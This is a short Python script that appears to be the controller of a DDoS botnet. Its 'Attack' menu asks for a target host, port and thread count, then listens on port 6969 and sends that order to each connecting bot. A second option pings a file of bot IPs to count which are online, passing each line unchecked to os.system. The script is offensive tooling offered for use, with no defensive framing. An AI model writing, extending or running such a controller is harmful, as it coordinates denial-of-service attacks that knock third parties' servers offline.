import socket
import os
import subprocess






def main():




    menu = input("""
------------------------------
1. Attack
2. Ping ips
3. Exit
------------------------------
> """)

    if menu == "1": # attack
        target = input(">Please input the IP or the Host name to Attack>> ")
        port = input(">Please input the port (80 by default)>> ")
        if port == "":
            port = "80"
        threads = input(">Please input the numbrer of threads you want>> ")

        sendData = (target + ":" + port + ":" + threads)

        print("------------------------------")
        print("Ip's Connected: ")


        host = ""#put your server ip here
        port = 6969
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host, port))
        sendData = sendData.encode("utf8")
        while True:
            s.listen(10)
            conn, addr = s.accept()
            print("[+] Connected by: " + str(addr))
            conn.sendall(sendData)










    elif menu == "2": #ping ips

        print("------------------------------")
        File = input(">Plese input the name of the .txt of ips>> ")
        print("------------------------------")
        ips = []
        online = 0
        try:
            f = open(File, "r")
        except:
            print("[-] ERROR file not found!")
            main()

        for lines in f:
            ips.append(lines)

        f.close()
        for i in range (len(ips)):
            ip = ips[i]

            response = os.system("ping -n 1 " + ip)

            if response == 0:
                print("[+] " + ip + " is ONLINE")
                online = online + 1
            else:
                print("[-] " + ip + " is OFFLINE!")

        print("------------------------------")
        print("Totel Online IPs: " + str(online))
        main()

    else:
        exit()

main()
